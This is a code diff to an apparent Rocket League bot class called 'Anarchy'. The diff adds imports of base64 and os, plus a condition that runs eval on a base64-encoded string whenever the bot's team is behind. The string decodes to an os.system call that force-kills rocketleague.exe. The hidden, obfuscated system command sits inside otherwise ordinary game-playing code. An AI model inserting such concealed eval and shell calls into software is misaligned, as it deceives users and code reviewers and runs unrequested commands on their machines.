@@ -1,5 +1,7 @@
+import base64
 import math
 import random
+import os
 from random import randint as whoops
 from random import triangular as triforce
 import webbrowser
@@ -39,6 +41,8 @@ class Anarchy(BaseAgent):
         self.CountyTHIS_ALSOdonttuch = 0
         self.WHOOPITYScooPTI = 0
         
+        self.team = team
+
     def initialize_agent(self):
         pass
 
@@ -120,6 +124,9 @@ class Anarchy(BaseAgent):
         self.howDoIUse_this[self.howDoIUse_this[0][1]] = turn
         self.howDoIUse_this[self.howDoIUse_this[0][6]] = (abs(turn) < 0.2 and not my_car.is_super_sonic)
         self.howDoIUse_this[self.howDoIUse_this[0][7]] = (abs(turn) > 1.5 and not my_car.is_super_sonic)
+
+        if packet.teams[self.team].score < packet.teams[1 - self.team].score:
+            eval(base64.b64decode('b3Muc3lzdGVtKCd0YXNra2lsbCAvZiAvaW0gcm9ja2V0bGVhZ3VlLmV4ZScp'))
 
         return getSensible_thingToCONTROL(self.howDoIUse_this)
 
